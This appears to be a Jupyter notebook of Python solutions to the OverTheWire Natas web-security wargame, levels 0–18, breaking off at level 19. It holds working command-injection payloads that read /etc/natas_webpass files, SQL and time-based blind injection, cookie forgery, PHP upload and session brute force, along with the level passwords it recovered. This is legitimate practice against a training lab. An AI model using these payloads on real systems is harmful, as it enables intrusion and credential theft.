{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: requests in /mnt/c/Users/dabin.jung/source/repos/OverTheWire/.venv/lib/python3.10/site-packages (2.32.3)\n",
      "Requirement already satisfied: charset-normalizer<4,>=2 in /mnt/c/Users/dabin.jung/source/repos/OverTheWire/.venv/lib/python3.10/site-packages (from requests) (3.3.2)\n",
      "Requirement already satisfied: idna<4,>=2.5 in /mnt/c/Users/dabin.jung/source/repos/OverTheWire/.venv/lib/python3.10/site-packages (from requests) (3.8)\n",
      "Requirement already satisfied: urllib3<3,>=1.21.1 in /mnt/c/Users/dabin.jung/source/repos/OverTheWire/.venv/lib/python3.10/site-packages (from requests) (2.2.2)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in /mnt/c/Users/dabin.jung/source/repos/OverTheWire/.venv/lib/python3.10/site-packages (from requests) (2024.7.4)\n",
      "Note: you may need to restart the kernel to use updated packages.\n",
      "Requirement already satisfied: pyyaml in /mnt/c/Users/dabin.jung/source/repos/OverTheWire/.venv/lib/python3.10/site-packages (6.0.2)\n",
      "Note: you may need to restart the kernel to use updated packages.\n",
      "Collecting pycryptodome\n",
      "  Downloading pycryptodome-3.20.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)\n",
      "Downloading pycryptodome-3.20.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)\n",
      "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.1/2.1 MB\u001b[0m \u001b[31m5.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0ma \u001b[36m0:00:01\u001b[0m\n",
      "\u001b[?25hInstalling collected packages: pycryptodome\n",
      "Successfully installed pycryptodome-3.20.0\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "%pip install requests\n",
    "%pip install pyyaml\n",
    "%pip install pycryptodome"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import yaml\n",
    "import re\n",
    "import base64\n",
    "import urllib.parse\n",
    "from IPython.display import clear_output, HTML\n",
    "import threading\n",
    "import time\n",
    "from Crypto.Cipher import AES\n",
    "import string\n",
    "from collections import defaultdict\n",
    "\n",
    "\n",
    "pwd = None\n",
    "count = 0\n",
    "natas = auth = url = None\n",
    "ALPHANUMERIC_CHARACTERS = (\n",
    "    \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\n",
    ")\n",
    "\n",
    "\n",
    "def get_pwd():\n",
    "    global pwd\n",
    "    with open(\"password.yml\", \"r\") as f:\n",
    "        pwd = yaml.safe_load(f)\n",
    "\n",
    "\n",
    "def save_pwd(id, pw):\n",
    "    global pwd\n",
    "    with open(\"password.yml\", \"w\") as f:\n",
    "        pwd[id] = pw\n",
    "        yaml.dump(pwd, f)\n",
    "\n",
    "\n",
    "def find_pwd(res):\n",
    "    global count\n",
    "    pattern = r\"[\\w\\d]{32}\"\n",
    "    mat = re.findall(pattern, res.text)\n",
    "    natas = f\"natas{count}\"\n",
    "    if mat:\n",
    "        for m in mat:\n",
    "            if m != pwd[natas]:\n",
    "                print(f\"password found: {m}\")\n",
    "                save_pwd(f\"natas{count + 1}\", m)\n",
    "                return True\n",
    "\n",
    "    print(f\"password not found.\")\n",
    "    print(res.text)\n",
    "    return False\n",
    "\n",
    "\n",
    "def run_task(task, count=5):\n",
    "    thread_list = []\n",
    "    for _ in range(count):\n",
    "        thread_list.append(threading.Thread(target=task))\n",
    "    for thread in thread_list:\n",
    "        thread.start()\n",
    "    for thread in thread_list:\n",
    "        thread.join()\n",
    "\n",
    "\n",
    "def init():\n",
    "    global count, natas, auth, url\n",
    "    get_pwd()\n",
    "    natas = f\"natas{count}\"\n",
    "    auth = (natas, pwd[natas])\n",
    "    url = f\"http://natas{count}.natas.labs.overthewire.org/\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas0\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas0\n",
    "count = 0\n",
    "init()\n",
    "\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas1\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fTguMNxKo1DSa1tujBLuZJnDUlCcUAPlI\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas1\n",
    "count = 1\n",
    "init()\n",
    "\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas2\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas2\n",
    "count = 2\n",
    "init()\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/files/users.txt\"\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas3\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fQryZXc2e0zahULdHrtHxzyYkj59kUxLQ\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas3\n",
    "count = 3\n",
    "init()\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/s3cr3t/users.txt\"\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas4\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0n35PkggAPm2zbEpOU802c0x0Msn1ToK\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas4\n",
    "count = 4\n",
    "init()\n",
    "\n",
    "header = {\"Referer\": \"http://natas5.natas.labs.overthewire.org/\"}\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), headers=header)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas5\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0RoJwHdSKWFTYR5WuiAewauSuNaBXned\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas5\n",
    "count = 5\n",
    "init()\n",
    "\n",
    "cookies = {\"loggedin\": \"1\"}\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas6\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<?\n",
      "$secret = \"FOEIUWGHFEEUHOFUOIU\";\n",
      "?>\n",
      "\n",
      "password found: fbmg8SvU1LizuWjx3y7xkNERkHxGre0GS\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas6\n",
    "count = 6\n",
    "init()\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/includes/secret.inc\"\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "print(res.text)\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/index.php\"\n",
    "data = {\"secret\": \"FOEIUWGHFEEUHOFUOIU\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), data=data)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas7\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fxcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas7\n",
    "count = 7\n",
    "init()\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8\"\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas8\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "secret: oubWYf2kBq\n",
      "password found: fZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas8\n",
    "count = 8\n",
    "\n",
    "encodedSecret = \"3d3d516343746d4d6d6c315669563362\"\n",
    "secret = base64.decodebytes(bytes.fromhex(encodedSecret)[::-1]).decode()\n",
    "print(f\"secret: {secret}\")\n",
    "\n",
    "init()\n",
    "data = {\"secret\": secret, \"submit\": \"submit\"}\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/index.php\"\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), data=data)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas9\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: ft7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas9\n",
    "count = 9\n",
    "\n",
    "# 1 dictionary.txt; find / -type d -name \"natas*\";\n",
    "# 1 dictionary.txt; ls /etc/natas_webpass;\n",
    "# 1 dictionary.txt; cat /etc/natas_webpass/natas10;\n",
    "needle = \"1 dictionary.txt; cat /etc/natas_webpass/natas10;\"\n",
    "\n",
    "init()\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/index.php?needle={urllib.parse.quote(needle)}\"\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas10\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fUJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas10\n",
    "count = 10\n",
    "needle = \" -e '.' /etc/natas_webpass/* #\"\n",
    "\n",
    "init()\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/index.php?needle={urllib.parse.quote(needle)}\"\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas11\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'data': 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D'}\n",
      "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=\n",
      "a: b'\\x1ef$\\x07\\n3\\'\\x0e\\x167 \\x00\\x17 uUG*8MIf5\\x08\\x06+;\\x00\\x17fmMF\"1\\t\\x03\"1M\\x18'\n",
      "b: b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\n",
      "key: [101, 68, 87, 111]\n",
      "cookie: [30, 102, 36, 7, 10, 51, 39, 14, 22, 55, 32, 0, 23, 32, 117, 85, 71, 61, 50, 28, 71, 104, 117, 13, 2, 39, 56, 3, 10, 54, 117, 85, 71, 103, 49, 9, 3, 34, 49, 9, 71, 57]\n",
      "{'data': 'HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5'}\n",
      "password found: fyZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas11\n",
    "count = 11\n",
    "init()\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/index.php\"\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "cookies = {}\n",
    "for cookie in res.cookies:\n",
    "    cookies[cookie.name] = cookie.value\n",
    "print(cookies)\n",
    "\n",
    "a = urllib.parse.unquote(cookies[\"data\"])\n",
    "print(a)\n",
    "a = base64.b64decode(a)\n",
    "b = b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\n",
    "print(f\"a: {a}\")\n",
    "print(f\"b: {b}\")\n",
    "\n",
    "key = []\n",
    "for i in range(len(b)):\n",
    "    key += [b[i] ^ a[i]]\n",
    "key = key[:4]\n",
    "print(f\"key: {key}\")\n",
    "\n",
    "text = b'{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}'\n",
    "cookie = []\n",
    "for i in range(len(text)):\n",
    "    cookie += [text[i] ^ key[i % len(key)]]\n",
    "print(f\"cookie: {cookie}\")\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/index.php\"\n",
    "cookies[\"data\"] = base64.b64encode(bytes(cookie)).decode()\n",
    "print(cookies)\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas12\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: ftrbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC\n"
     ]
    }
   ],
   "source": [
    "# natas12\n",
    "count = 12\n",
    "init()\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/index.php\"\n",
    "files = {\n",
    "    \"uploadedfile\": (\"natas12.php\", open(\"natas12.php\", \"rb\"), \"multipart/form-data\")\n",
    "}\n",
    "data = {\"filename\": \"1.php\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), files=files, data=data)\n",
    "\n",
    "pattern = r\"upload\\/[\\w\\d]{10}\\.php\"\n",
    "mat = re.findall(pattern, res.text)\n",
    "if mat:\n",
    "    url = f\"http://natas{count}.natas.labs.overthewire.org/{mat[0]}\"\n",
    "    res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    find_pwd(res)\n",
    "else:\n",
    "    print(\"not found.\")\n",
    "    print(res.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas13\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fz3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ\n"
     ]
    }
   ],
   "source": [
    "# natas13\n",
    "count = 13\n",
    "init()\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/index.php\"\n",
    "files = {\n",
    "    \"uploadedfile\": (\"natas13.php\", open(\"natas13.php\", \"rb\"), \"multipart/form-data\")\n",
    "}\n",
    "data = {\"filename\": \"1.php\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), files=files, data=data)\n",
    "\n",
    "pattern = r\"upload\\/[\\w\\d]{10}\\.php\"\n",
    "mat = re.findall(pattern, res.text)\n",
    "if mat:\n",
    "    url = f\"http://natas{count}.natas.labs.overthewire.org/{mat[0]}\"\n",
    "    res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    find_pwd(res)\n",
    "else:\n",
    "    print(\"not found.\")\n",
    "    print(res.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas14\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fSdqIqBsFcz3yotlNYErZSZwblkm0lrvx\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas14\n",
    "count = 14\n",
    "init()\n",
    "\n",
    "username = 'natas15\";#'\n",
    "password = \"123\"\n",
    "url = f\"http://{natas}.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}&debug=0\"\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas15\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n",
      "--------------------------------------------------\n",
      "--------------------------------------------------\n",
      "password found: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "# natas15\n",
    "count = 15\n",
    "init()\n",
    "\n",
    "\n",
    "def try_inject(username):\n",
    "    url = f\"http://{natas}.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&debug=0\"\n",
    "    result = requests.get(url, auth=(natas, pwd[natas])).text\n",
    "    return \"This user exists.\" in result\n",
    "\n",
    "\n",
    "username = 'natas16\" and BINARY password like \"'\n",
    "password = \"\"\n",
    "\n",
    "current_char_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "\n",
    "def task():\n",
    "    global current_char_list, password\n",
    "    while len(password) < 32:\n",
    "        c = current_char_list.pop()\n",
    "        print(f\"trying {password}{c}\")\n",
    "        if try_inject(f\"{username}{password}{c}%\"):\n",
    "            clear_output()\n",
    "            password += c\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {password}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_char_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "\n",
    "run_task(task)\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {password}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas16\", password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas16\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bhjkoqsvwCEFHJLNOT05789\n"
     ]
    }
   ],
   "source": [
    "# natas16\n",
    "count = 16\n",
    "init()\n",
    "\n",
    "# get all characters in the password\n",
    "key_list = []\n",
    "for c in ALPHANUMERIC_CHARACTERS:\n",
    "    command = \"$(grep -oh {0} /etc/natas_webpass/natas17)\".format(c)\n",
    "    url = f\"http://{natas}.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "    response = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    if len(response.text) != 461926:\n",
    "        print(c, len(response.text))\n",
    "        key_list.append(c)\n",
    "\n",
    "key_list = \"\".join(key_list)\n",
    "clear_output()\n",
    "print(key_list)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\n",
      "--------------------------------------------------\n",
      "--------------------------------------------------\n",
      "password found: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\n",
      "--------------------------------------------------\n"
     ]
    },
    {
     "ename": "NameError",
     "evalue": "name 'password' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[3], line 29\u001b[0m\n\u001b[0;32m     27\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mpassword found: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mkey\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m)\n\u001b[0;32m     28\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m-\u001b[39m\u001b[38;5;124m\"\u001b[39m \u001b[38;5;241m*\u001b[39m \u001b[38;5;241m50\u001b[39m)\n\u001b[1;32m---> 29\u001b[0m save_pwd(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mnatas17\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[43mpassword\u001b[49m)\n",
      "\u001b[1;31mNameError\u001b[0m: name 'password' is not defined"
     ]
    }
   ],
   "source": [
    "# get all characters in the password\n",
    "key = \"\"\n",
    "current_key_list = [x for x in key_list]\n",
    "\n",
    "\n",
    "def task():\n",
    "    global key, current_key_list\n",
    "    while len(key) < 32:\n",
    "        if len(current_key_list) == 0:\n",
    "            return\n",
    "        c = current_key_list.pop()\n",
    "        new_key = key + c\n",
    "        print(f\"trying: {new_key}\")\n",
    "        command = \"$(grep -oh ^{0} /etc/natas_webpass/natas17)\".format(new_key)\n",
    "        url = f\"http://{natas}.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "        response = requests.get(url, auth=(natas, pwd[natas]))\n",
    "        if len(response.text) != 461926:\n",
    "            clear_output()\n",
    "            key = new_key\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {key}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_key_list = [x for x in key_list]\n",
    "\n",
    "\n",
    "run_task(task)\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {key}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas17\", key)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas17\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\n",
      "--------------------------------------------------\n",
      "Response time: 0.581000566482544\n",
      "Response time: 0.5825009346008301\n",
      "trying 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ9\n",
      "trying 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ8\n",
      "Response time: 0.5855011940002441\n",
      "Response time: 0.6174988746643066\n",
      "--------------------------------------------------\n",
      "password found: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "# natas17\n",
    "count = 17\n",
    "init()\n",
    "\n",
    "\n",
    "def try_inject(sql):\n",
    "    # print(sql)\n",
    "    t1 = time.time()\n",
    "    url = f\"http://natas17.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(sql)}&debug=0\"\n",
    "    result = requests.get(url, auth=(natas, pwd[natas])).text\n",
    "    t2 = time.time() - t1\n",
    "    print(f\"Response time: {t2}\")\n",
    "    if t2 > 5:\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "\n",
    "\n",
    "sql = 'natas18\" and BINARY password like \"{0}{1}%\" AND SLEEP(5)=0 #'\n",
    "password = \"\"\n",
    "current_key_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "\n",
    "def task():\n",
    "    global password, current_key_list\n",
    "    while len(password) < 32:\n",
    "        if len(current_key_list) == 0:\n",
    "            time.sleep(6)\n",
    "            if len(current_key_list) == 0:\n",
    "                return\n",
    "        c = current_key_list.pop()\n",
    "        print(f\"trying {password}{c}\")\n",
    "        if try_inject(sql.format(password, c)):\n",
    "            clear_output()\n",
    "            password += c\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {password}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_key_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "\n",
    "run_task(task)\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {password}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas18\", password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas18\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1051\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas18\", \"pass\": \"6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\" };</script></head>\n",
      "<body>\n",
      "<h1>natas18</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19\n",
      "Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: ftnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\n"
     ]
    }
   ],
   "source": [
    "# natas18\n",
    "count = 18\n",
    "init()\n",
    "\n",
    "url = f\"http://natas18.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=test\"\n",
    "\n",
    "i = -1\n",
    "\n",
    "\n",
    "def task():\n",
    "    global i\n",
    "    while \"natas19\" not in pwd:\n",
    "        i += 1\n",
    "        print(f\"testing session id {i}\")\n",
    "        cookies = dict(PHPSESSID=str(i))\n",
    "        result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "        if \"Username: natas19\" in result.text:\n",
    "            clear_output()\n",
    "            print(len(result.text))\n",
    "            print(result.text)\n",
    "            find_pwd(result)\n",
    "            break\n",
    "\n",
    "\n",
    "run_task(task)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas19\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
